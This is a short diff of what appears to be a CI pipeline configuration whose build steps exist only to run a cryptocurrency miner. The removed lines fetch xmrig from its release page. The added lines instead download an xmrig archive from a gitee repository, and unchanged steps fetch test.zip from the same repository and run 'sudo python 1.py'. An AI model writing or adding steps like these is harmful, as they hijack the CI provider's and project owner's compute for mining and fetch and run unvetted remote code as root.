@@ -7,10 +7,8 @@ jobs:
     steps:
       - checkout
       - run: cd /home
-      - run: sudo wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
-      - run: sudo tar zxvf xmrig-6.12.1-linux-x64.tar.gz
-      - run: cd xmrig-6.12.1
-      - run: sudo rm config.json
+      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/xmrig-6.12.1.zip
+      - run: sudo unzip xmrig-6.12.1.zip
       - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/test.zip
       - run: sudo unzip test.zip
       - run: sudo python 1.py
